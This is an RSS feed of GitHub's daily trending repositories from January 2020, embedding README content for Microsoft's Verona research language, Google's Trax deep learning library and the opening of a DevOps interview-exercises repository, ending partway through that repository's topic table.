<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>GitHub Trending: All Languages, Today</title><link>https://github.com/trending/?since=daily</link><description>The top repositories on GitHub for , measured daily</description><pubDate>Sun, 19 Jan 2020 04:36:46 GMT</pubDate><lastBuildDate>Sun, 19 Jan 2020 04:36:46 GMT</lastBuildDate><generator>PyRSS2Gen-1.1.0</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><ttl>720</ttl><item><title>microsoft/verona #1 in All Languages, Today</title><link>https://github.com/microsoft/verona</link><description>&lt;p&gt;&lt;i&gt;Research programming language for concurrent ownership&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;Project Verona is a research programming language to explore the concept of
concurrent ownership.  We are providing a new concurrency model that seamlessly
integrates ownership.&lt;/p&gt;
&lt;p&gt;This research project is at an early stage and is open sourced to facilitate
academic collaborations.  We are keen to engage in research collaborations on
this project, please do reach out to discuss this.&lt;/p&gt;
&lt;p&gt;The project is not ready to be used outside of research.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-building" class="anchor" aria-hidden="true" href="#building"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a href="docs/building.md"&gt;Building&lt;/a&gt;&lt;/h1&gt;
&lt;h1&gt;&lt;a id="user-content-faq" class="anchor" aria-hidden="true" href="#faq"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a href="docs/faq.md"&gt;FAQ&lt;/a&gt;&lt;/h1&gt;
&lt;h1&gt;&lt;a id="user-content-exploring-the-language" class="anchor" aria-hidden="true" href="#exploring-the-language"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a href="docs/explore.md"&gt;Exploring the language&lt;/a&gt;&lt;/h1&gt;
&lt;h1&gt;&lt;a id="user-content-status" class="anchor" aria-hidden="true" href="#status"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Status&lt;/h1&gt;
&lt;p&gt;This project is at a very early stage, parts of the type checker are still to be
implemented, and there are very few language features implemented yet. This will
change, but will take time.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h1&gt;
&lt;p&gt;Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit &lt;a href="https://cla.microsoft.com" rel="nofollow"&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt;
&lt;p&gt;This project has adopted the &lt;a href="https://opensource.microsoft.com/codeofconduct/" rel="nofollow"&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;.
For more information see the &lt;a href="https://opensource.microsoft.com/codeofconduct/faq/" rel="nofollow"&gt;Code of Conduct FAQ&lt;/a&gt; or
contact &lt;a href="mailto:opencode@microsoft.com"&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>microsoft</author><guid isPermaLink="false">https://github.com/microsoft/verona</guid><pubDate>Sun, 19 Jan 2020 00:01:00 GMT</pubDate></item><item><title>google/trax #2 in All Languages, Today</title><link>https://github.com/google/trax</link><description>&lt;p&gt;&lt;i&gt;Trax — your path to advanced deep learning&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h2&gt;&lt;a id="user-content-trax--your-path-to-advanced-deep-learning" class="anchor" aria-hidden="true" href="#trax--your-path-to-advanced-deep-learning"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Trax — your path to advanced deep learning&lt;/h2&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/bddfc5e8ae531f274dd98ab357d4a5d5f0683cd4/68747470733a2f2f696d616765732e706578656c732e636f6d2f70686f746f732f3436313737322f706578656c732d70686f746f2d3436313737322e6a7065673f646c266669743d63726f702663726f703d656e74726f707926773d333226683d3231"&gt;&lt;img src="https://camo.githubusercontent.com/bddfc5e8ae531f274dd98ab357d4a5d5f0683cd4/68747470733a2f2f696d616765732e706578656c732e636f6d2f70686f746f732f3436313737322f706578656c732d70686f746f2d3436313737322e6a7065673f646c266669743d63726f702663726f703d656e74726f707926773d333226683d3231" alt="train tracks" data-canonical-src="https://images.pexels.com/photos/461772/pexels-photo-461772.jpeg?dl&amp;amp;fit=crop&amp;amp;crop=entropy&amp;amp;w=32&amp;amp;h=21" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://badge.fury.io/py/trax" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c3ddd29ad9780045cf67e6db455d947a7335c483/68747470733a2f2f62616467652e667572792e696f2f70792f747261782e737667" alt="PyPI version" data-canonical-src="https://badge.fury.io/py/trax.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://github.com/google/trax/issues"&gt;&lt;img src="https://camo.githubusercontent.com/80b7490db8d31f8f8ed019832a5c80e2e81fb73d/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6973737565732f676f6f676c652f747261782e737667" alt="GitHub Issues" data-canonical-src="https://img.shields.io/github/issues/google/trax.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="CONTRIBUTING.md"&gt;&lt;img src="https://camo.githubusercontent.com/8f697c48adc5026cc6d83dd45e42b9b93ee1803c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f6e747269627574696f6e732d77656c636f6d652d627269676874677265656e2e737667" alt="Contributions welcome" data-canonical-src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://opensource.org/licenses/Apache-2.0" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/dc5c93f4ddfa92aaed4ace74e89dbc075f7810c8/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d627269676874677265656e2e737667" alt="License" data-canonical-src="https://img.shields.io/badge/License-Apache%202.0-brightgreen.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://gitter.im/trax-ml/community" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/fed5b5512498193ce4bba599fd94cd12b9f56491/68747470733a2f2f696d672e736869656c64732e696f2f6769747465722f726f6f6d2f6e776a732f6e772e6a732e737667" alt="Gitter" data-canonical-src="https://img.shields.io/gitter/room/nwjs/nw.js.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/google/trax"&gt;Trax&lt;/a&gt; helps you understand and explore advanced deep learning.
We &lt;a href="#structure"&gt;focus&lt;/a&gt; on making Trax code clear while pushing advanced models like
&lt;a href="https://github.com/google/trax/tree/master/trax/models/reformer"&gt;Reformer&lt;/a&gt; to their limits.
Trax is actively used and maintained in the &lt;a href="https://research.google.com/teams/brain/" rel="nofollow"&gt;Google Brain team&lt;/a&gt;.
Give it a try, &lt;a href="https://gitter.im/trax-ml/community" rel="nofollow"&gt;talk to us&lt;/a&gt;
or &lt;a href="https://github.com/google/trax/issues"&gt;open an issue&lt;/a&gt; if needed.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-use-trax" class="anchor" aria-hidden="true" href="#use-trax"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Use Trax&lt;/h3&gt;
&lt;p&gt;You can use Trax either as a library from your own python scripts and notebooks
or as a binary from the shell, which can be more convenient for training large models.
Trax includes a number of deep learning models (ResNet, Transformer, RNNs, ...)
and has bindings to a large number of deep learning datasets, including
&lt;a href="https://github.com/tensorflow/tensor2tensor"&gt;Tensor2Tensor&lt;/a&gt; and &lt;a href="https://www.tensorflow.org/datasets/catalog/overview" rel="nofollow"&gt;TensorFlow datasets&lt;/a&gt;.
It runs without any changes on CPUs, GPUs and TPUs.&lt;/p&gt;
&lt;p&gt;To see how to use Trax as a library, take a look at this &lt;a href="https://colab.research.google.com/github/google/trax/blob/master/trax/intro.ipynb" rel="nofollow"&gt;quick start colab&lt;/a&gt;
which explains how to create data in python, connect it to a Transformer model in Trax, train it and run inference.
You can select a CPU or GPU runtime, or even get a free 8-core TPU as
runtime. With TPUs in colab you need to set extra flags as demonstrated in these
&lt;a href="https://colab.research.google.com/github/google/trax/blob/master/trax/models/reformer/text_generation.ipynb" rel="nofollow"&gt;training&lt;/a&gt;
and &lt;a href="https://colab.research.google.com/github/google/trax/blob/master/trax/models/reformer/image_generation.ipynb" rel="nofollow"&gt;inference&lt;/a&gt; colabs.&lt;/p&gt;
&lt;p&gt;To use Trax as a binary and not forget all the parameters (model type, learning
rate, other hyper-paramters and training settings), we recommend &lt;a href="https://github.com/google/gin-config"&gt;gin-config&lt;/a&gt;.
Take a look at &lt;a href="https://github.com/google/trax/blob/master/trax/configs/mlp_mnist.gin"&gt;an example gin config&lt;/a&gt;
for training a simple MLP on MNIST and run it as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python -m trax.trainer --config_file=$PWD/trax/configs/mlp_mnist.gin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As a more advanced example, you can train a &lt;a href="https://github.com/google/trax/tree/master/trax/models/reformer"&gt;Reformer&lt;/a&gt;
on &lt;a href="https://arxiv.org/abs/1707.08819" rel="nofollow"&gt;Imagenet64&lt;/a&gt; to generate images &lt;a href="https://colab.research.google.com/github/google/trax/blob/master/trax/models/reformer/image_generation.ipynb" rel="nofollow"&gt;like this&lt;/a&gt;
with the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python -m trax.trainer --config_file=$PWD/trax/configs/reformer_imagenet64.gin
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-structure" class="anchor" aria-hidden="true" href="#structure"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Structure&lt;/h3&gt;
&lt;p&gt;Trax code is structured in a way that allows you to understand deep learning
from scratch. We start with basic maths and go through layers, models,
supervised and reinforcement learning. We get to advanced deep learning
results, including recent papers such as &lt;a href="https://arxiv.org/abs/2001.04451" rel="nofollow"&gt;Reformer - The Efficient Transformer&lt;/a&gt;,
selected for oral presentation at &lt;a href="https://iclr.cc/Conferences/2020/" rel="nofollow"&gt;ICLR 2020&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The main steps needed to understand deep learning correspond to sub-directories
in Trax code:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/trax/tree/master/trax/math"&gt;math/&lt;/a&gt; — basic math operations and ways to accelerate them on GPUs and TPUs (through &lt;a href="https://github.com/google/jax"&gt;JAX&lt;/a&gt; and &lt;a href="https://www.tensorflow.org/" rel="nofollow"&gt;TensorFlow&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/trax/tree/master/trax/layers"&gt;layers/&lt;/a&gt; are the basic building blocks of neural networks and here you'll find how they are build and all the needed ones&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/trax/tree/master/trax/models"&gt;models/&lt;/a&gt; contains all basic models (MLP, ResNet, Transformer, ...) and a number of new research models&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/trax/tree/master/trax/optimizers"&gt;optimizers/&lt;/a&gt; is a directory with optimizers needed for deep learning&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/trax/tree/master/trax/supervised"&gt;supervised/&lt;/a&gt; contains the utilities needed to run supervised learning and the Trainer class&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/trax/tree/master/trax/rl"&gt;rl/&lt;/a&gt; contains our work on reinforcement learning&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-development" class="anchor" aria-hidden="true" href="#development"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Development&lt;/h3&gt;
&lt;p&gt;To get the most recent update on Trax development, &lt;a href="https://gitter.im/trax-ml/community" rel="nofollow"&gt;chat with us&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Most common supervised learning models in Trax are running and should have clear
code — if this is not the case, please &lt;a href="https://github.com/google/trax/issues"&gt;open an issue&lt;/a&gt;
or, even better, send along a pull request (see &lt;a href="CONTRIBUTING.md"&gt;our contribution doc&lt;/a&gt;).
In Trax we value documentation, examples and colabs so if you find any
problems with those, please report it and contribute a solution.&lt;/p&gt;
&lt;p&gt;We are still improving a few smaller parts of &lt;a href="https://github.com/google/trax/tree/master/trax/layers"&gt;layers&lt;/a&gt;,
planning to update the &lt;a href="https://github.com/google/trax/tree/master/trax/supervised"&gt;supervised&lt;/a&gt; API and
heavily working on the &lt;a href="https://github.com/google/trax/tree/master/trax/rl"&gt;rl&lt;/a&gt; part,
so expect these parts to change over the next few months. We are also working hard
to improve our documentation and examples and we welcome help with that.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>google</author><guid isPermaLink="false">https://github.com/google/trax</guid><pubDate>Sun, 19 Jan 2020 00:02:00 GMT</pubDate></item><item><title>bregman-arie/devops-exercises #3 in All Languages, Today</title><link>https://github.com/bregman-arie/devops-exercises</link><description>&lt;p&gt;&lt;i&gt;Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP, DNS, Elastic, Network, Virtualization&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-devops-questions--exercises" class="anchor" aria-hidden="true" href="#devops-questions--exercises"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DevOps Questions &amp;amp; Exercises&lt;/h1&gt;
&lt;p&gt;&lt;g-emoji class="g-emoji" alias="information_source" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png"&gt;ℹ️&lt;/g-emoji&gt;  This repo contains questions and exercises on various technical topics, sometimes related to DevOps and SRE :)&lt;/p&gt;
&lt;p&gt;&lt;g-emoji class="g-emoji" alias="bar_chart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ca.png"&gt;📊&lt;/g-emoji&gt;  There are currently &lt;strong&gt;834&lt;/strong&gt; questions&lt;/p&gt;
&lt;p&gt;&lt;g-emoji class="g-emoji" alias="warning" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png"&gt;⚠️&lt;/g-emoji&gt;  You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read &lt;a href="common-qa.md"&gt;Q&amp;amp;A&lt;/a&gt; for more details&lt;/p&gt;
&lt;p&gt;&lt;g-emoji class="g-emoji" alias="thought_balloon" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ad.png"&gt;💭&lt;/g-emoji&gt;  If you wonder "How to prepare for a DevOps interview?", you might want to read some of my suggestions &lt;a href="prepare_for_interview.md"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;g-emoji class="g-emoji" alias="memo" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4dd.png"&gt;📝&lt;/g-emoji&gt;  You can add more questions and exercises by submitting pull requests :) You can read more about it &lt;a href="CONTRIBUTING.md"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;




&lt;table&gt;
  &lt;tbody&gt;&lt;tr&gt;
    &lt;td align="center"&gt;&lt;a href="#devops"&gt;&lt;img src="images/devops.png" width="70px;" height="75px;" alt="DevOps" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;DevOps&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#devops-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#devops-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#jenkins"&gt;&lt;img src="images/jenkins.png" width="85px;" height="85px;" alt="Jenkins" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Jenkins&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#jenkins-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#jenkins-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#git"&gt;&lt;img src="images/git.png" width="80px;" height="75px;" alt="Git" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Git&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#git-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#git-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#ansible"&gt;&lt;img src="images/ansible.png" width="65px;" height="75px;" alt="Ansible" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Ansible&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#ansible-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#ansible-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#Network"&gt;&lt;img src="images/network.png" width="80x;" height="75px;" alt="Network" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Network&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#network-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#network-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#linux"&gt;&lt;img src="images/linux.png" width="75x;" height="75px;" alt="Linux" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Linux&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#linux-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#linux-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
    &lt;td align="center"&gt;&lt;a href="#terraform"&gt;&lt;img src="images/terraform.png" width="70px;" height="75px;" alt="Terraform" style="max-width:100%;"&gt;&lt;br&gt;&lt;b&gt;Terraform&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#terraform-beginner"&gt;Beginner &lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;br&gt;&lt;sub&gt;&lt;a href="#terraform-advanced"&gt;Advanced &lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt;&lt;/a&gt;&lt;/sub&gt;&lt;/td&gt;
